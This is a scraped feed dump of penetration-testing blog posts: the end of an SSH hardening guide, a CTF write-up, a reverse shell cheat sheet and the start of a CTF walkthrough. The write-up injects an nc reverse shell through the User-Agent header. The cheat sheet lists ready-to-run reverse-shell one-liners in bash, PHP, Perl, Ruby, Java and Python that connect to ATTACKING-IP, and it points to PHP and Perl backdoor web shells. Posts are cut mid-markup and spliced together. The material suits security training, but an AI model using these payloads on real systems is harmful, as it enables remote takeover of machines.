<code>/etc/ssh/sshd_config</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">HostbasedAuthentication no</code></pre> \n</figure> \n<h3 id=\"disable-ssh-root-login\">Disable SSH Root Login</h3> \n<p>Disable root logins via SSH, open <code>/etc/ssh/sshd_config</code> and ensure the following line exists:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">PermitRootLogin no</code></pre> \n</figure> \n<h3 id=\"disable-ssh-access-via-empty-passwords\">Disable SSH Access via Empty Passwords</h3> \n<p>Open <code>/etc/ssh/sshd_config</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">PermitEmptyPasswords no</code></pre> \n</figure> \n<h3 id=\"enable-ssh-warning-banner\">Enable SSH Warning Banner</h3> \n<p>Enable a warning banner (Renforce policy awareness).</p> \n<p>Banner <code>/etc/issue</code></p> \n<h3 id=\"do-not-allow-ssh-environment-options\">Do Not Allow SSH Environment Options</h3> \n<p>To ensure users are not able to present environment options to the SSH daemon, add or correct the following line in <code>/etc/ssh/sshd_config</code>:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">PermitUserEnvironment no</code></pre> \n</figure> \n<h3 id=\"use-only-approved-ciphers\">Use Only Approved Ciphers</h3> \n<p>Limit the ciphers to those algorithms which are FIPS-approved. Counter (CTR) mode is also preferred over cipher-block chaining (CBC) mode. The following line in <code>/etc/ssh/sshd_config</code> demonstrates use of FIPS-approved ciphers:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Ciphers aes128-ctr,aes192-ctr,aes256-ctr,aes128-cbc,3des-cbc,aes192-cbc,aes256-cbc</code></pre> \n</figure> \n<h2 id=\"secure-x-windows\">Secure X Windows</h2> \n<h3 id=\"disable-x-windows-startup-by-setting-runlevel\">Disable X Windows Startup By Setting Runlevel</h3> \n<p>Disable X windows system, further reducing your attack surface.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">Add <span class=\"nb\">id</span>:3:initdefault: to /etc/inittab.</code></pre> \n</figure> \n<h3 id=\"remove-the-x-windows-package-group\">Remove the X Windows Package Group</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">yum groupremove <span class=\"s2\">\"X Window System\"</span></code></pre> \n</figure> \n<h2 id=\"prompt-os-update-installation\">Prompt OS update installation</h2> \n<p>A process for prompt installation of OS updates must exist</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">yum <span class=\"nt\">-y</span> <span class=\"nb\">install </span>yum-cron\nchkconfig yum-cron on</code></pre> \n</figure> \n<p>Make sure yum-cron is set to “check only”, I don’t recommend installing updates automatically.</p> \n<p>If this was helpfull, click tweet below.</p> \n<p>Enjoy.</p>","descriptionType":"text/html","publishedDate":"Wed, 25 Mar 2015 00:52:10 +0000","feedId":11390,"bgimg":"http://i.imgur.com/z6hxOZG.png","linkMd5":"26eda1e1fa5ed55ecbe74b6f0749c28a","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn32@2020_4/2020/08/25/01-24-54-384_2bd08491a7db385b.webp","destWidth":450,"destHeight":200,"sourceBytes":13149,"destBytes":13380,"author":"Arr0way","articleImgCdnMap":{"http://i.imgur.com/z6hxOZG.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn32@2020_4/2020/08/25/01-24-54-384_2bd08491a7db385b.webp"},"publishedOrCreatedDate":1598318675555},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"InsomniHack CTF Teaser - Smartcat2 Writeup","link":"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/#challenge-description\" id=\"markdown-toc-challenge-description\">Challenge Description</a></li> \n <li><a href=\"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/#insomnihack-smartcat-2\" id=\"markdown-toc-insomnihack-smartcat-2\">InsomniHack Smartcat 2</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/#procselfenviron-injection\" id=\"markdown-toc-procselfenviron-injection\">proc/self/environ Injection</a></li> \n   <li><a href=\"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat2-writeup/#reverse-shell\" id=\"markdown-toc-reverse-shell\">Reverse Shell</a></li> \n  </ul> </li> \n</ul> \n<h2 id=\"challenge-description\">Challenge Description</h2> \n<p>Exploit the web based ping command tool and capture the flag.</p> \n<p><img src=\"https://highon.coffee/img/blog/insomnihack/smartcat2.png\" alt=\"smartcat2 CTF\" /></p> \n<h2 id=\"insomnihack-smartcat-2\">InsomniHack Smartcat 2</h2> \n<p>Due to filtering it was impossible to enter any white space in commands, making it far more difficult than the smartcat1 challenge. Initially I tried and failed to use a <code>/dev/tcp/ip/port</code> reverse shell.</p> \n<h3 id=\"procselfenviron-injection\">proc/self/environ Injection</h3> \n<p>The environment variable <code>HTTP_USER_AGENT=</code> which contains the contents of the <code>User-Agent:</code> field, had no filtering allowing for easy injection of a reverse shell.</p> \n<p>Using command injection it was possible to execute <code>/proc/self/env</code> and successfully execute a reverse shell.</p> \n<h3 id=\"reverse-shell\">Reverse Shell</h3> \n<p>Putting it all together using curl:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">curl <span class=\"s1\">'http://smartcat.insomnihack.ch/cgi-bin/index.cgi'</span> <span class=\"nt\">--user-agent</span> <span class=\"s1\">';rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc XXX.XXX.XXX.XXX 80 &gt;/tmp/f;exit'</span> <span class=\"nt\">--data</span> <span class=\"s1\">'dest=%0ash&lt;/proc/self/environ'</span></code></pre> \n</figure> \n<p>The flag was not readable by <code>www-data</code>, the binary <code>readflag</code> was required to read the contents of the flag.</p> \n<p>A couple of lines needed typing in to “confirm” you had an interactive shell, after entering the flag was displayed:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">www-data@smartcat:/home/smartcat<span class=\"nv\">$ </span>./readflag\n./readflag\nGive me a...\nGive me a...\n... flag!\n... flag!\nFlag:\n            ___\n        .-<span class=\"s2\">\"; ! ;\"</span>-.\n      .<span class=\"s1\">'!  : | :  !`.\n     /\\  ! : ! : !  /\\\n    /\\ |  ! :|: !  | /\\\n   (  \\ \\ ; :!: ; / /  )\n  ( `. \\ | !:|:! | / .'</span> <span class=\"o\">)</span>\n  <span class=\"o\">(</span><span class=\"sb\">`</span><span class=\"nb\">.</span> <span class=\"se\">\\ \\ \\!</span>:|:!/ / / .<span class=\"s1\">')\n   \\ `.`.\\ |!|! |/,'</span>.<span class=\"s1\">' /\n    `._`.\\\\\\!!!// .'</span>_.<span class=\"s1\">'\n       `.`.\\\\|//.'</span>.<span class=\"s1\">'\n        |`._`n'</span>_.<span class=\"s1\">'|  hjw\n        \"----^----\"\n\nINS{shells_are _way_better_than_cats}\n\nwww-data@smartcat:/home/smartcat$</span></code></pre> \n</figure> \n<p>Thanks for the challenge :)</p>","descriptionType":"text/html","publishedDate":"Mon, 18 Jan 2016 14:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/insomnihack/smartcat2.png","linkMd5":"aab81500fd9fb499ec3bd07fec27ef2c","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn63@2020_6/2020/08/25/01-24-54-465_a2ea12b8b076d1c5.webp","destWidth":707,"destHeight":290,"sourceBytes":90498,"destBytes":20542,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/insomnihack/smartcat2.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn63@2020_6/2020/08/25/01-24-54-465_a2ea12b8b076d1c5.webp"},"publishedOrCreatedDate":1598318675546},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Reverse Shell Cheat Sheet","link":"https://highon.coffee/blog/reverse-shell-cheat-sheet/","description":"<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#setup-listening-netcat\" id=\"markdown-toc-setup-listening-netcat\">Setup Listening Netcat</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#bash-reverse-shells\" id=\"markdown-toc-bash-reverse-shells\">Bash Reverse Shells</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell\" id=\"markdown-toc-php-reverse-shell\">PHP Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#netcat-reverse-shell\" id=\"markdown-toc-netcat-reverse-shell\">Netcat Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#telnet-reverse-shell\" id=\"markdown-toc-telnet-reverse-shell\">Telnet Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-reverse-shell\" id=\"markdown-toc-perl-reverse-shell\">Perl Reverse Shell</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#perl-windows-reverse-shell\" id=\"markdown-toc-perl-windows-reverse-shell\">Perl Windows Reverse Shell</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#ruby-reverse-shell\" id=\"markdown-toc-ruby-reverse-shell\">Ruby Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#java-reverse-shell\" id=\"markdown-toc-java-reverse-shell\">Java Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#python-reverse-shell\" id=\"markdown-toc-python-reverse-shell\">Python Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#gawk-reverse-shell\" id=\"markdown-toc-gawk-reverse-shell\">Gawk Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-web-shells\" id=\"markdown-toc-kali-web-shells\">Kali Web Shells</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-php-web-shells\" id=\"markdown-toc-kali-php-web-shells\">Kali PHP Web Shells</a></li> \n   <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-perl-reverse-shell\" id=\"markdown-toc-kali-perl-reverse-shell\">Kali Perl Reverse Shell</a></li> \n   <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-cold-fusion-shell\" id=\"markdown-toc-kali-cold-fusion-shell\">Kali Cold Fusion Shell</a></li> \n   <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-asp-shell\" id=\"markdown-toc-kali-asp-shell\">Kali ASP Shell</a></li> \n   <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-aspx-shells\" id=\"markdown-toc-kali-aspx-shells\">Kali ASPX Shells</a></li> \n   <li><a href=\"https://highon.coffee/blog/reverse-shell-cheat-sheet/#kali-jsp-reverse-shell\" id=\"markdown-toc-kali-jsp-reverse-shell\">Kali JSP Reverse Shell</a></li> \n  </ul> </li> \n</ul> \n<p>During penetration testing if you’re lucky enough to find a remote command execution vulnerability, you’ll more often than not want to connect back to your attacking machine to leverage an interactive shell.</p> \n<p>Below are a collection of <strong>reverse shells</strong> that use commonly installed programming languages, or commonly installed binaries (nc, telnet, bash, etc). At the bottom of the post are a collection of uploadable reverse shells, present in Kali Linux.</p> \n<p>If you found this resource usefull you should also check out our <a href=\"https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/\">penetration testing tools</a> cheat sheet which has some additional reverse shells and other commands useful when performing penetration testing.</p> \n<h2 id=\"setup-listening-netcat\">Setup Listening Netcat</h2> \n<p>Your remote shell will need a listening netcat instance in order to connect back.</p> \n<div class=\"note tip\"> \n <h5>Set your Netcat listening shell on an allowed port</h5> \n <p>Use a port that is likely allowed via outbound firewall rules on the target network, e.g. 80 / 443</p> \n</div> \n<p>To setup a listening netcat instance, enter the following:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">root@kali:~# nc <span class=\"nt\">-nvlp</span> 80\nnc: listening on :: 80 ...\nnc: listening on 0.0.0.0 80 ...</code></pre> \n</figure> \n<div class=\"note info\"> \n <h5>NAT requires a port forward</h5> \n <p>If you're attacking machine is behing a NAT router, you'll need to setup a port forward to the attacking machines IP / Port.</p> \n</div> \n<p><strong>ATTACKING-IP</strong> is the machine running your listening netcat session, port 80 is used in all examples below (for reasons mentioned above).</p> \n<h2 id=\"bash-reverse-shells\">Bash Reverse Shells</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">exec</span> /bin/bash 0&amp;0 2&gt;&amp;0</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">0&lt;&amp;196<span class=\"p\">;</span><span class=\"nb\">exec </span>196&lt;<span class=\"o\">&gt;</span>/dev/tcp/ATTACKING-IP/80<span class=\"p\">;</span> sh &lt;&amp;196 <span class=\"o\">&gt;</span>&amp;196 2&gt;&amp;196</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">exec </span>5&lt;<span class=\"o\">&gt;</span>/dev/tcp/ATTACKING-IP/80\n<span class=\"nb\">cat</span> &lt;&amp;5 | <span class=\"k\">while </span><span class=\"nb\">read </span>line<span class=\"p\">;</span> <span class=\"k\">do</span> <span class=\"nv\">$line</span> 2&gt;&amp;5 <span class=\"o\">&gt;</span>&amp;5<span class=\"p\">;</span> <span class=\"k\">done</span>  \n\n<span class=\"c\"># or:</span>\n\n<span class=\"k\">while </span><span class=\"nb\">read </span>line 0&lt;&amp;5<span class=\"p\">;</span> <span class=\"k\">do</span> <span class=\"nv\">$line</span> 2&gt;&amp;5 <span class=\"o\">&gt;</span>&amp;5<span class=\"p\">;</span> <span class=\"k\">done</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">bash <span class=\"nt\">-i</span> <span class=\"o\">&gt;</span>&amp; /dev/tcp/ATTACKING-IP/80 0&gt;&amp;1</code></pre> \n</figure> \n<h2 id=\"php-reverse-shell\">PHP Reverse Shell</h2> \n<p>A useful PHP reverse shell:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">php <span class=\"nt\">-r</span> <span class=\"s1\">'$sock=fsockopen(\"ATTACKING-IP\",80);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</span>\n<span class=\"o\">(</span>Assumes TCP uses file descriptor 3. If it doesn<span class=\"s1\">'t work, try 4,5, or 6)</span></code></pre> \n</figure> \n<h2 id=\"netcat-reverse-shell\">Netcat Reverse Shell</h2> \n<p>Useful netcat reverse shell examples:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nc <span class=\"nt\">-e</span> /bin/sh ATTACKING-IP 80</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">/bin/sh | nc ATTACKING-IP 80</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> /tmp/p<span class=\"p\">;</span> <span class=\"nb\">mknod</span> /tmp/p p <span class=\"o\">&amp;&amp;</span> nc ATTACKING-IP 4444 0/tmp/p</code></pre> \n</figure> \n<h2 id=\"telnet-reverse-shell\">Telnet Reverse Shell</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">rm</span> <span class=\"nt\">-f</span> /tmp/p<span class=\"p\">;</span> <span class=\"nb\">mknod</span> /tmp/p p <span class=\"o\">&amp;&amp;</span> telnet ATTACKING-IP 80 0/tmp/p</code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443</code></pre> \n</figure> \n<p>Remember to listen on 443 on the attacking machine also.</p> \n<h2 id=\"perl-reverse-shell\">Perl Reverse Shell</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-perl\" data-lang=\"perl\"><span class=\"nv\">perl</span> <span class=\"o\">-</span><span class=\"nv\">e</span> <span class=\"p\">'</span><span class=\"s1\">use Socket;$i=\"ATTACKING-IP\";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};</span><span class=\"p\">'</span></code></pre> \n</figure> \n<h3 id=\"perl-windows-reverse-shell\">Perl Windows Reverse Shell</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-perl\" data-lang=\"perl\"><span class=\"nv\">perl</span> <span class=\"o\">-</span><span class=\"nv\">MIO</span> <span class=\"o\">-</span><span class=\"nv\">e</span> <span class=\"p\">'</span><span class=\"s1\">$c=new IO::Socket::INET(PeerAddr,\"ATTACKING-IP:80\");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;</span><span class=\"p\">'</span></code></pre> \n</figure> \n<figure class=\"highlight\"> \n <pre><code class=\"language-perl\" data-lang=\"perl\"><span class=\"nv\">perl</span> <span class=\"o\">-</span><span class=\"nv\">e</span> <span class=\"p\">'</span><span class=\"s1\">use Socket;$i=\"ATTACKING-IP\";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};</span><span class=\"p\">'</span></code></pre> \n</figure> \n<h2 id=\"ruby-reverse-shell\">Ruby Reverse Shell</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-ruby\" data-lang=\"ruby\"><span class=\"n\">ruby</span> <span class=\"o\">-</span><span class=\"n\">rsocket</span> <span class=\"o\">-</span><span class=\"n\">e</span><span class=\"s1\">'f=TCPSocket.open(\"ATTACKING-IP\",80).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'</span></code></pre> \n</figure> \n<h2 id=\"java-reverse-shell\">Java Reverse Shell</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-java\" data-lang=\"java\"><span class=\"n\">r</span> <span class=\"o\">=</span> <span class=\"nc\">Runtime</span><span class=\"o\">.</span><span class=\"na\">getRuntime</span><span class=\"o\">()</span>\n<span class=\"n\">p</span> <span class=\"o\">=</span> <span class=\"n\">r</span><span class=\"o\">.</span><span class=\"na\">exec</span><span class=\"o\">([</span><span class=\"s\">\"/bin/bash\"</span><span class=\"o\">,</span><span class=\"s\">\"-c\"</span><span class=\"o\">,</span><span class=\"s\">\"exec 5&lt;&gt;/dev/tcp/ATTACKING-IP/80;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"</span><span class=\"o\">]</span> <span class=\"n\">as</span> <span class=\"nc\">String</span><span class=\"o\">[])</span>\n<span class=\"n\">p</span><span class=\"o\">.</span><span class=\"na\">waitFor</span><span class=\"o\">()</span></code></pre> \n</figure> \n<h2 id=\"python-reverse-shell\">Python Reverse Shell</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"n\">python</span> <span class=\"o\">-</span><span class=\"n\">c</span> <span class=\"s\">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKING-IP\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</span></code></pre> \n</figure> \n<h2 id=\"gawk-reverse-shell\">Gawk Reverse Shell</h2> \n<figure class=\"highlight\"> \n <pre><code class=\"language-gawk\" data-lang=\"gawk\">#!/usr/bin/gawk -f\n\nBEGIN {\n        Port    =       8080\n        Prompt  =       \"bkd&gt; \"\n\n        Service = \"/inet/tcp/\" Port \"/0/0\"\n        while (1) {\n                do {\n                        printf Prompt |&amp; Service\n                        Service |&amp; getline cmd\n                        if (cmd) {\n                                while ((cmd |&amp; getline) &gt; 0)\n                                        print $0 |&amp; Service\n                                close(cmd)\n                        }\n                } while (cmd != \"exit\")\n                close(Service)\n        }\n}</code></pre> \n</figure> \n<h2 id=\"kali-web-shells\">Kali Web Shells</h2> \n<p>The following shells exist within Kali Linux, under <code>/usr/share/webshells/</code> these are only useful if you are able to upload, inject or transfer the shell to the machine.</p> \n<h3 id=\"kali-php-web-shells\">Kali PHP Web Shells</h3> \n<p>Kali PHP reverse shells and command shells:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/usr/share/webshells/php/<br />php-reverse-shell.php</code></p> </td> \n    <td> <p>Pen Test Monkey - PHP Reverse Shell</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/usr/share/webshells/<br />php/php-findsock-shell.php</code></p> <p><code>/usr/share/webshells/<br />php/findsock.c</code></p> </td> \n    <td> <p>Pen Test Monkey, Findsock Shell. Build <code>gcc -o findsock findsock.c</code> (be mindfull of the target servers architecture), execute with netcat not a browser <code>nc -v target 80</code></p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/usr/share/webshells/<br />php/simple-backdoor.php</code></p> </td> \n    <td> <p>PHP backdoor, usefull for CMD execution if upload / code injection is possible, usage: <code>http://target.com/simple-<br />backdoor.php?cmd=cat+/etc/passwd</code></p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/usr/share/webshells/<br />php/php-backdoor.php</code></p> </td> \n    <td> <p>Larger PHP shell, with a text input box for command execution.</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<div class=\"note tip\"> \n <h5>Tip: Executing Reverse Shells</h5> \n <p>The last two shells above are not reverse shells, however they can be useful for executing a reverse shell.</p> \n</div> \n<h3 id=\"kali-perl-reverse-shell\">Kali Perl Reverse Shell</h3> \n<p>Kali perl reverse shell:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/usr/share/webshells/perl/<br />perl-reverse-shell.pl</code></p> </td> \n    <td> <p>Pen Test Monkey - Perl Reverse Shell</p> </td> \n   </tr> \n   <tr> \n    <td> <p><code>/usr/share/webshells/<br />perl/perlcmd.cgi</code></p> </td> \n    <td> <p>Pen Test Monkey, Perl Shell. Usage: <code>http://target.com/perlcmd.cgi?cat /etc/passwd</code></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"kali-cold-fusion-shell\">Kali Cold Fusion Shell</h3> \n<p>Kali Coldfusion Shell:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/usr/share/webshells/cfm/cfexec.cfm</code></p> </td> \n    <td> <p>Cold Fusion Shell - aka CFM Shell</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"kali-asp-shell\">Kali ASP Shell</h3> \n<p>Classic ASP Reverse Shell + CMD shells:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/usr/share/webshells/asp/</code></p> </td> \n    <td> <p>Kali ASP Shells</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"kali-aspx-shells\">Kali ASPX Shells</h3> \n<p>ASP.NET reverse shells within Kali:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Command</th> \n id=\"author-description\">Author Description</h2> \n<p> I created this machine to help others learn some basic CTF hacking strategies and some tools. I aimed this machine to be very similar in difficulty to those I was breaking on the OSCP. </p> \n<p>##Enumeration</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"> \n\nV <span class=\"nt\">-A</span> <span class=\"nt\">-sT</span> <span class=\"nt\">-p</span> 1-65535  192.168.30.140  \n\nStarting Nmap 7.00 <span class=\"o\">(</span> https://nmap.org <span class=\"o\">)</span> at 2015-11-23 12:36 EST\nStats: 0:00:07 elapsed<span class=\"p\">;</span> 0 hosts completed <span class=\"o\">(</span>1 up<span class=\"o\">)</span>, 1 undergoing Connect Scan\nConnect Scan Timing: About 2.72% <span class=\"k\">done</span><span class=\"p\">;</span> ETC: 12:40 <span class=\"o\">(</span>0:03:35 remaining<span class=\"o\">)</span>\nNmap scan report <span class=\"k\">for </span>192.168.30.140\nHost is up, received arp-response <span class=\"o\">(</span>0.00037s latency<span class=\"o\">)</span><span class=\"nb\">.</span>\nNot shown: 65533 filtered ports\nReason: 65533 no-responses\nPORT     STATE SERVICE REASON  VERSION\n22/tcp   open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.3 <span class=\"o\">(</span>Ubuntu Linux<span class=\"p\">;</span>\nprotocol 2.0<span class=\"o\">)</span>\n| ssh-hostkey: \n|   1024 3c:3d:e3:8e:35:f9:da:74:20:ef:aa:49:4a:1d:ed:dd <span class=\"o\">(</span>DSA<span class=\"o\">)</span>\n|   2048 85:94:6c:87:c9:a8:35:0f:2c:db:bb:c1:3f:2a:50:c1 <span class=\"o\">(</span>RSA<span class=\"o\">)</span>\n|_  256 f3:cd:aa:1d:05:f2:1e:8c:61:87:25:b6:f4:34:45:37 <span class=\"o\">(</span>ECDSA<span class=\"o\">)</span>\n1337/tcp open  http    syn-ack Apache httpd 2.4.7 <span class=\"o\">((</span>Ubuntu<span class=\"o\">))</span>\n|_http-server-header: Apache/2.4.7 <span class=\"o\">(</span>Ubuntu<span class=\"o\">)</span>\n|_http-title: Site doesn<span class=\"s1\">'t have a title (text/html).\nMAC Address: 00:0C:29:D0:63:8A (VMware)\nWarning: OSScan results may be unreliable because we could not find at least 1\nopen and 1 closed port\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.10 - 3.19, Linux 3.2 - 4.0\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.37 ms 192.168.30.140\n\nOS and Service detection performed. Please report any incorrect results at\nhttps://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 118.92 seconds\nEnumeration process started. </span></code></pre> \n</figure> \n<p>###Service Enumeration</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 6.6.1p1 Ubuntu</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 1337</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache/2.4.7 (Ubuntu)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<p>###HTTP Enumeration</p> \n<p>Viewing any 404 page rendered:</p> \n<p><img src=\"https://highon.coffee/img/blog/lotr/base64-src.png\" alt=\"base64 image\" /></p> \n<p>Inspection of the page source revealed a base64 encoded string, encoded within another string:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"> \n<span class=\"o\">[</span>root:~]# <span class=\"nb\">echo</span> <span class=\"s2\">\"THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh\"</span> | <span class=\"nb\">base64</span> <span class=\"nt\">-d</span>\n<span class=\"nv\">Lzk3ODM0NTIxMC9pbmRleC5waHA</span><span class=\"o\">=</span> Closer!#\n<span class=\"o\">[</span>root:~]# <span class=\"nb\">echo</span> <span class=\"s2\">\"Lzk3ODM0NTIxMC9pbmRleC5waHA=\"</span> | <span class=\"nb\">base64</span> <span class=\"nt\">-d</span>\n/978345210/index.php#</code></pre> \n</figure> \n<p>The above URL exposed a web form, vulnerable to SQL injection.</p> \n<h2 